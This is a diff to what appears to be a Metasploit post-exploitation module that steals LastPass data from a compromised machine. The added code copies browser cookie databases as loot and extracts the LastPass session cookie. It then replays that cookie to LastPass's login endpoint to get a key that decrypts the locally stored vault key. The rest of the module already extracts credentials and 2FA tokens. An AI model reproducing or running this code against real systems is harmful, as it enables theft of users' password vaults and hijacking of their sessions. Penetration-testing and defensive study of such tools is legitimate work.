@@ -45,6 +45,9 @@ class Metasploit3 < Msf::Post
     print_status "Extracting credentials"
     extract_credentials(account_map)
 
+    #print_status "Decrypting local stored key"
+    #decrypt_local_vault_key(account_map)
+
     print_status "Extracting 2FA tokens"
     extract_2fa_tokens(account_map)
 
@@ -83,6 +86,12 @@ class Metasploit3 < Msf::Post
           'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
           'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
         }
+        cookies_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Cookies",
+          'Firefox' => "",
+          'Opera' => "",
+          'Safari' => ""
+        }
       when /unix|linux/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
@@ -93,6 +102,12 @@ class Metasploit3 < Msf::Post
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
           'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
           'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
+        }
+        cookies_path_map = { #TODO
+          'Chrome' => "",
+          'Firefox' => "",
+          'Opera' => "",
+          'Safari' => ""
         }
       when /osx/
         browser_path_map = {
@@ -107,6 +122,12 @@ class Metasploit3 < Msf::Post
           'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
           'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
         }
+        cookies_path_map = { #TODO
+          'Chrome' => "",
+          'Firefox' => "",
+          'Opera' => "",
+          'Safari' => ""
+        }
       else
         print_error "Platform not recognized: #{platform}"
       end
@@ -119,8 +140,12 @@ class Metasploit3 < Msf::Post
           account_map[account][browser]['lp_db_path'] = db_paths
           if session.type == "meterpreter"
             account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser == 'Firefox'
+            account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if client.fs.file.exists?(cookies_path_map[browser]) || browser == 'Firefox'
+            #account_map[account][browser]['cookies_db'] = cookies_path_map[browser]['lp_db_path'].gsub("prefs.js", "cookies.sqlite") if client.fs.file.exists?(cookies_path_map[browser]['lp_db_path']) && browser == 'Firefox'
           else # session.type == "shell"
             account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if session.shell_command("ls \"#{localstorage_path_map[browser]}\"").strip == localstorage_path_map[browser].strip || browser == 'Firefox'
+            account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if session.shell_command("ls \"#{cookies_path_map[browser]}\"").strip == cookies_path_map[browser].strip || browser == 'Firefox'
+            #account_map[account][browser]['cookies_db'] = cookies_path_map[browser]['lp_db_path'] if session.shell_command("ls \"#{cookies_path_map[browser]['lp_db_path']}\"").strip == cookies_path_map[browser]['lp_db_path'].strip && browser == 'Firefox'
           end
         else
           account_map[account].delete(browser)
@@ -257,7 +282,6 @@ class Metasploit3 < Msf::Post
     credentials
   end
 
-
   def decrypt_data(key, encrypted_data)
     return nil if encrypted_data.blank?
 
@@ -346,7 +370,6 @@ class Metasploit3 < Msf::Post
     end
   end
 
-
   #Extracts the 2FA token from localStorage
   def extract_2fa_tokens(account_map)
     account_map.each_pair do |account, browser_map|
@@ -388,7 +411,6 @@ class Metasploit3 < Msf::Post
     end
   end
 
-
   #Print all extracted LastPass data
   def print_lastpass_data(account_map)
     lastpass_data_table = Rex::Ui::Text::Table.new(
@@ -419,7 +441,6 @@ class Metasploit3 < Msf::Post
       print_vault_passwords(account_map)
     end
   end
-
 
   def extract_vault_and_iterations(account_map)
     account_map.each_pair do |account, browser_map|
@@ -496,16 +517,86 @@ class Metasploit3 < Msf::Post
   def extract_vault_keys(account_map)
     account_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, lp_data|
+        browser_checked = false # Track if local stored vault key was already decrypted for this browser
         lp_data['lp_creds'].each_pair do |username, user_data|
-          if !user_data['lp_password'].blank? && user_data['iterations'] != nil# Derive vault key from credentials
+          if !user_data['lp_password'].blank? && user_data['iterations'] != nil # Derive vault key from credentials
             lp_data['lp_creds'][username]['vault_key'] = derive_vault_key_from_creds(username, lp_data['lp_creds'][username]['lp_password'], user_data['iterations'])
-          else # Get vault key from disabled OTP
-            otpbin = extract_otpbin(account, browser, username, lp_data)
-            lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
+          else # Get vault key decrypting the locally stored one or from the disabled OTP
+            if !browser_checked
+              decrypt_local_vault_key(account, browser_map) 
+              browser_checked = true
+            end
+            if lp_data['lp_creds'][username]['vault_key'] == nil # If not vault key was found yet, try with dOTP
+              otpbin = extract_otpbin(account, browser, username, lp_data)
+              lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
+            end
           end
         end
       end
     end
+  end
+
+  # Decrypt the locally stored vault key
+  def decrypt_local_vault_key account, browser_map
+      browser_map.each_pair do |browser, lp_data|
+        case browser
+        when /Chrome/
+          query = "SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'"
+        when "Opera"
+          query = ""
+        when "Firefox"
+          query = "SELECT value FROM moz_cookies WHERE baseDomain = 'lastpass.com' AND name = 'PHPSESSID'"
+        when "Safari"
+          query = ""
+        else
+          query = nil
+          print_error "Browser #{browser} not recognized"
+        end
+
+        data = read_file(lp_data['cookies_db'])
+        loot_path = store_loot(
+          "#{browser.downcase}.lastpass.cookies",
+          'application/x-sqlite3',
+          session,
+          data,
+          nil,
+          "#{account}'s #{browser} cookies DB"
+        )
+
+        # Parsing/Querying the DB
+        db = SQLite3::Database.new(loot_path)
+        begin
+          result = db.execute(query)
+        rescue
+          vprint_error "No session cookie was found in #{account}'s #{browser}"
+          next
+        end
+        next if result.blank? # No session cookie found for this browser
+        session_cookie = windows_unprotect(Base64.encode64(result[0][0])) # TODO: Support other browsers/OSs
+
+        # Use the cookie to obtain the encryption key to decrypt the vault key
+        uri = URI('https://lastpass.com/login_check.php')
+        request = Net::HTTP::Post.new(uri)
+        request.set_form_data("wxsessid" => URI.unescape(session_cookie),"uuid" => browser_map['lp_2fa'])
+        request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
+        response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }
+
+        # Parse response
+        next if !response.body.match(/pwdeckey\="([a-z0-9]+)"/) # Session must have expired
+        decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey\="([a-z0-9]+)"/)[1])
+        username = response.body.match(/lpusername="([A-Za-z0-9._%+-@]+)"/)[1]
+
+        # Get the local encrypted vault key
+        db = SQLite3::Database.new(lp_data['lp_db_loot'])
+        result = db.execute(
+          "SELECT data FROM LastPassData " \
+          "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'key'"
+        )
+        encrypted_vault_key = result[0][0].split("\n")[0]
+
+        # Decrypt the local stored key
+        lp_data['lp_creds'][username]['vault_key'] = decrypt_data([decryption_key].pack("H*"), encrypted_vault_key)
+      end
   end
 
   # Returns otp, encrypted_key
@@ -524,7 +615,6 @@ class Metasploit3 < Msf::Post
       [result[0][1]].pack "H*"
     end
   end
-
 
   def derive_vault_key_from_creds username, password, key_iteration_count
     if key_iteration_count == 1
@@ -551,9 +641,7 @@ class Metasploit3 < Msf::Post
     request = Net::HTTP::Post.new(uri)
     request.set_form_data("login" => 1, "xml" => 1, "hash" => otp_token, "otpemail" => URI.escape(username), "outofbandsupported" => 1, "changepw" => otp_token)
     request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
-    response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) {|http|
-      http.request(request)
-    }
+    response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) {|http| http.request(request) }
 
     # Parse response
     encrypted_vault_key = nil
